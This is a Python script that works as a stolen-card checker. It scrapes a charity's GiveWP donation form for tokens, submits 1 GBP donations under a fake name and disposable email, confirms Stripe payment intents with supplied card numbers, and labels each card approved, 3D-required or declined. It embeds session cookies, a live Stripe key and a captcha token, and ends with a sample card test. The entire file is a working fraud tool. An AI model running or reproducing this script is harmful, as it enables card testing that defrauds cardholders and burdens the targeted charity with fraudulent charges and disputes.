import requests
import requests
from bs4 import BeautifulSoup
import html
import re
from urllib.parse import urlparse, parse_qs
from faker import Faker
import random
def cr(ccx):
    ccx = ccx.strip()
    n, mm, yy, cvc = ccx.split("|")


    cookies = {
    '__stripe_mid': 'cb088fba-6a38-4d20-b56b-679dfebb9f4e1a49c9',
    '__stripe_sid': '598dd357-cb61-4775-a2c0-b86ebf818042dbcfb8',
}

    headers = {
    'authority': 'charlenesproject.org',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    # 'cookie': '__stripe_mid=cb088fba-6a38-4d20-b56b-679dfebb9f4e1a49c9; __stripe_sid=598dd357-cb61-4775-a2c0-b86ebf818042dbcfb8',
    'referer': 'https://charlenesproject.org/donate',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'iframe',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'upgrade-insecure-requests': '1',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'givewp-route': 'donation-form-view',
    'form-id': '108368',
    'locale': 'en_GB',
}

    response = requests.get('https://charlenesproject.org/', params=params, cookies=cookies, headers=headers)    
    

    html_text = response.text

    id_match = re.search(r'"donationFormId":\s*(\d+)', html_text)
    if id_match:
        form_id = id_match.group(1)
        print("donationFormId:", form_id)
    else:
        print("donationFormId not found.")


    nonce_match = re.search(r'"donationFormNonce":"(.*?)"', html_text)
    if nonce_match:
        form_nonce = nonce_match.group(1)
        print("donationFormNonce:", form_nonce)
    else:
        print("donationFormNonce not found.")

    m = re.search(r'"donateUrl"\s*:\s*"([^"]+)"', html_text)
    if m:
        donate_url = html.unescape(m.group(1))
        parsed = urlparse(donate_url)
        q = parse_qs(parsed.query)

        sig = q.get("givewp-route-signature", ["Not found"])[0]
        exp = q.get("givewp-route-signature-expiration", ["Not found"])[0]

        print("Signature:", sig)
        print("Expiration:", exp)
    else:
        print("donateUrl not found")
    session=requests.Session()
    
    headers = {
    'authority': 'charlenesproject.org',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    
   
    'origin': 'https://charlenesproject.org',
    'referer': 'https://charlenesproject.org/?givewp-route=donation-form-view&form-id=108368&locale=en_GB',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    params = {
    'givewp-route': 'donate',
    'givewp-route-signature': sig,
    'givewp-route-signature-id': 'givewp-donate',
    'givewp-route-signature-expiration': exp,
}

    files = {
    'formId': (None, '108368'),
    'amount': (None, '1'),
    'currency': (None, 'GBP'),
    'donationType': (None, 'single'),
    'subscriptionPeriod': (None, 'one-time'),
    'subscriptionFrequency': (None, '1'),
    'subscriptionInstallments': (None, '0'),
    'gatewayId': (None, 'stripe_payment_element'),
    'firstName': (None, 'Shaikh'),
    'lastName': (None, 'Wasiullah'),
    'email': (None, 'caleboh973@maonyn.com'),
    'anonymous': (None, 'false'),
    'donationBirthday': (None, ''),
    'originUrl': (None, 'https://charlenesproject.org/donate'),
    'isEmbed': (None, 'true'),
    'embedId': (None, 'give-form-shortcode-1'),
    'locale': (None, 'en_GB'),
    'gatewayData[stripePaymentMethod]': (None, 'card'),
    'gatewayData[stripePaymentMethodIsCreditCard]': (None, 'true'),
    'gatewayData[formId]': (None, '108368'),
    'gatewayData[stripeKey]': (None, 'pk_live_51EimNqFfF71I3G8kt9dz90HsEPO3BmPLVtFkSB1s0341i6RBQsCH1TtWR1qj67ApBlrQ0tDouUGAElffY0BXYmDZ00IC3yNesO'),
    'gatewayData[stripeConnectedAccountId]': (None, 'acct_1EimNqFfF71I3G8k'),
}

    response = requests.post('https://charlenesproject.org/', params=params,  headers=headers, files=files)



# Parse the JSON response
    data = response.json()

# Get the full clientSecret
    full_client_secret = data['data']['clientSecret']

# Extract the half client ID (everything before '_secret_')
    half_client_secret = full_client_secret.split('_secret_')[0]

# Print both
    print("Half client:", half_client_secret)
    print("Full client:", full_client_secret)


    headers = {
    'authority': 'api.stripe.com',
    'accept': 'application/json',
    'accept-language': 'en-IN,en-GB;q=0.9,en-US;q=0.8,en;q=0.7,de;q=0.6',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="137", "Not/A)Brand";v="24"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Mobile Safari/537.36',
}

    data = f'return_url=https%3A%2F%2Fcharlenesproject.org%2Fdonate%3Fgivewp-event%3Ddonation-completed%26givewp-listener%3Dshow-donation-confirmation-receipt%26givewp-receipt-id%3D8560e0fbac9a6afd685027d8ef8156bc%26givewp-embed-id%3Dgive-form-shortcode-1&payment_method_data[billing_details][name]=Shaikh+Wasiullah&payment_method_data[billing_details][email]=caleboh973%40maonyn.com&payment_method_data[billing_details][address][country]=YE&payment_method_data[type]=card&payment_method_data[card][number]={n}&payment_method_data[card][cvc]={cvc}&payment_method_data[card][exp_year]={yy}&payment_method_data[card][exp_month]={mm}&payment_method_data[allow_redisplay]=unspecified&payment_method_data[payment_user_agent]=stripe.js%2F93bc6d7bcf%3B+stripe-js-v3%2F93bc6d7bcf%3B+payment-element%3B+deferred-intent%3B+autopm&payment_method_data[referrer]=https%3A%2F%2Fcharlenesproject.org&payment_method_data[time_on_page]=56625&payment_method_data[client_attribution_metadata][client_session_id]=3d2b021b-3bb1-47a4-b3f7-fc4914bc77fd&payment_method_data[client_attribution_metadata][merchant_integration_source]=elements&payment_method_data[client_attribution_metadata][merchant_integration_subtype]=payment-element&payment_method_data[client_attribution_metadata][merchant_integration_version]=2021&payment_method_data[client_attribution_metadata][payment_intent_creation_flow]=deferred&payment_method_data[client_attribution_metadata][payment_method_selection_flow]=automatic&payment_method_data[client_attribution_metadata][elements_session_config_id]=0840db82-1fca-49f7-a7b4-9d7fbc3f47b4&payment_method_data[guid]=8679103b-45ca-4667-8cb3-9e30fef2d54c7dc798&payment_method_data[muid]=cb088fba-6a38-4d20-b56b-679dfebb9f4e1a49c9&payment_method_data[sid]=bd755eb4-7382-4968-816a-62ca5d36ac9fd2273d&expected_payment_method_type=card&client_context[currency]=gbp&client_context[mode]=payment&radar_options[hcaptcha_token]=P1_eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwZCI6MCwiZXhwIjoxNzU4NjQ1NzU0LCJjZGF0YSI6IjgyRUlJWENoQWl3bzI0WGx3eUd2UDdTSVpuVGNYUHBxaUNENmxCV2kvcU0wQTBrV3p3YitQUnlzV2ZSUEpha29JMW5ZeWFCem5MNjYrSFZ3WUwwSjMzQWhsVS9pSTJiVkNJaktlZlNHNUdESEdZaGdqT2lVWGFTMEJ0NnBXa1AyMTBid1daUUg0TG02ZHA3N2VhN0FLcmFha3J5Z08wWXZlOFNTbGYxR1lhc2RxdGNjcVUyejZIUDZaNmd2T3Zac3ZObERlUmQrOWJqYVlUMEYiLCJwYXNza2V5IjoiR3RoL0wzZ3FiWi9Iem1IWEI1c2VOeEk3QVI1cjFDOCtzY3pVT1Z5RlNkd1h2RW1oQ1JGdzZPdVdwRCtpd21RckkxU0dNelFFQ0dqb3ptck41bkZ4MEhPWmllTlJNM0ZLNW1XOGFBTjhseEFFcW9yMmFBREp0RTJPMTVacU5qTGNCL2FqRks4bjJrcStBN3lqanVqOG53TkVzM1IyTUROZU5KSnA0MnBuWnJ1dnJINllBUWhHZXk1dVpuUk5nTVlHRWl0TmJQRTV6VTZUSkhsTHJ2YThyditPL05tTElpTjdaZjNueVZvQ2xKc3hFaUxOTlJ5ZVlBQXI5VFZ6T3VmeHF1QmVXVTFVVmxOdXpTNWR4QUFUR21rNG1RZlNwcGo0dFY4d2tpWW1SVCtmMGxhTW13czQvdThFV1NaUTNVcUhHQUpUWlZYQy9YTzBVWS9RYXFaY3hOQjh2R2JRYk8yK0lac3pRZDgrYnpkMTByb2JJeHJYQzVrNGhQODdUTnU3NmhUbDRjelQ5ZWdzYkRrSm1ObkNUR2xYdGtGNUtJemlBbzUwNzl0TFNaRmdoN0tLY0pMRjZyTzBTU2puVEc0anYwYjZuWi9tZXZ3dUx4Qy9LcllYTUloYlZ5UDNxRG5CV21XZEFwMlpCY1NSN0lLVmhWWlROMVR0VWxPc1F4all2ejRlU3RRZ1FkRVJkcmNDMGorRnhaekttZEk2YTVybHFwM0ljSzMrOEZWbHNtOTFzY2NrTHdkcEF4aFBWUjB1MWdYMWh6Mm1NUmc1SW9UWXllQ2VBblRGV2I3L1NiVlVrc0tsOHdiN3lsU0M5MWdnZTNkaXkrT1JUaHJpN3prVVJTZE00R2lEdUpXL3BqMnZwRFplOEVEOHNSU0xCMkFVSHpycnZweVpkNnN6eVV0YXZGZERYQXhqWEc3ZW1nSEdMV0M5ZnlXN3ZtV3NyVEJiUkcwQ0o1ZzJlVVl5em55N1ZlSmx0NzMwL00xMmNrYkhDeDFDZkRMY2lSaUFDK0NnWGZMU3czQTYxSCtQQ3VkdE9ZYnhvS2w3dksxeWQrak13UHU0N1JVMng0Tk1UR1JhMXZNV2p4cXpOcENNR2VJRlJOVmM2YkIyT2VxVG9pVlVBV3dhL1ljU201MUtlMEExY21TUmdLaTRPRFJTWGdSWU5Tck5PSE5FTU1zRC8vSnhVTzBXaG5leEhscVNOUlNaeGNaZUpsUjlLaFIvVjd4aWg4UEw3VWF1UE4vN1E2Vk9IMXdhWGRTRS95ZWM5a25tUTM4MWd1YjAyOU1MR2FDSUxRVkRBL29KKzI0SW4zNEV0UUMzWERBaTJoMk15bWRpbFUxNDM0ZjdnaGVRaklHTmhSbTd1cWs5SWcxU3R5bmFCVDZQaFRYRktFOFlRZWZ1OTdmT1Y4OHJsb1BLZElBMmE1QnBVU1NhRnVMVjBDSHYxV3RBOWttbWpPOTRqSGIxd2tia1ZNbDgxQW80QVArZ3ZTbDlFamVkYlFqMlhkQ0dwQkxTWXFJRmMrN0JlWDdCYTBTbmJ3N3FZR25BanQzK1p5M0Z6eVdZb2lCTzR4NU1oTTRpeDk5L1M0eTd3aVc1c1RSYmtHRUFRcEhXTktIQ0dOSGN5VWVsQ01taytrcHVuNHErcW81VG1HTXNNODcrdmVHS3J1M3BPVXJ3bkJNOHV1dU5pdVB0Q05EbWhoRFRqM0lLL2FNeG5jRjNVRnBmKzVaTXV5dTV1TStIa0hHTlhxYlRMamt4c25jL0ZFci9rMGNmckpJazRSbXE0MWZidmNYWFg0TkFZS2tMNFpUTGdqSkdwVndFZnhONzhnUSsrYThRanlJTmEwTWNSSTcybDVNQmZuUHVEUzViWW5zZTdWaGlyOXFhckpsd0t0V1BvL283bUxxdG50bGN4b2dKbGRuL0NjenVkb3M0VjFROWp5VWtKczFCNGZZK09mS2VTdGRzZHFKNVhuellTeHlaZGV6VEE1UGNtcGRFTkw2NTZSRUZSa3RJN1BGUWQ3dHVYVk5Dc04ydWtVUXB0SXFtTHI3S1hVNnl2ZklWV3kwT1djaHFhV1BSbzJFZUZ2ZGttL1ZScmlTVmRDNTNxaVBrMWpSbWJCMWRpc1ZkZXVWeW5qTkxUZVhrMHVjY0FQWTFvd1A2SDMzUm5aQWJvREN4RXlCZWpqYzNMbWhVaXZaUWxOVHhEWmo5eU5BYXpDdlM0ZUU0alZpaTNJQzdsQkMxTXlxcCtTN3ZlbVNJRjdDcUxVR1pLN3ZBM2JFVklqYXg5RUxhVnpndGNjblFJbG4vemt0SVFaKzhrZFpSN09sTGYwb29OMjZPOUFJNHBMSGtldXYvS3c1S0FiMjVqN2xEbFc5bm9aYmE0YjdkM1UzUDBIdW8iLCJrciI6IjIzMmExNzYzIiwic2hhcmRfaWQiOjI1OTE4OTM1OX0.9Wfz-B9fAKbtFfryGKM1morAPazNN6Ylc0eTJtz3n8Q&use_stripe_sdk=true&key=pk_live_51EimNqFfF71I3G8kt9dz90HsEPO3BmPLVtFkSB1s0341i6RBQsCH1TtWR1qj67ApBlrQ0tDouUGAElffY0BXYmDZ00IC3yNesO&_stripe_account=acct_1EimNqFfF71I3G8k&client_attribution_metadata[client_session_id]=3d2b021b-3bb1-47a4-b3f7-fc4914bc77fd&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=automatic&client_attribution_metadata[elements_session_config_id]=0840db82-1fca-49f7-a7b4-9d7fbc3f47b4&client_secret={full_client_secret}'

    response = requests.post(
    f'https://api.stripe.com/v1/payment_intents/{half_client_secret}/confirm',
    headers=headers,
    data=data,
    
)
    
    print(response.text)

    resp = response.json()

# ✅ Check if it's an error object
    if "error" in resp:
        error = resp["error"]
        decline_code = error.get("decline_code") or error.get("code", "unknown_error")
        message = error.get("message", "Unknown error occurred")
        print(f"❌ Stripe Error: {decline_code} - {message}")
        return decline_code

# ✅ Check if 3D Secure authentication is needed
    elif resp.get("next_action", {}).get("type") == "use_stripe_sdk":
        print("🔐 3D Card: Additional authentication required")
        return "3D Required"

# ✅ Check for successful payment
    elif resp.get("status") == "succeeded":
        print("✅ Payment Approved")
        return "Charge Card"
    
# ⚠️ Catch-all for anything else
    else:
        print(f"⚠️ Unhandled Status: {resp.get('status')}")
        return resp
        
        
#
print(cr("5385460449548478|10|2030|880"))     
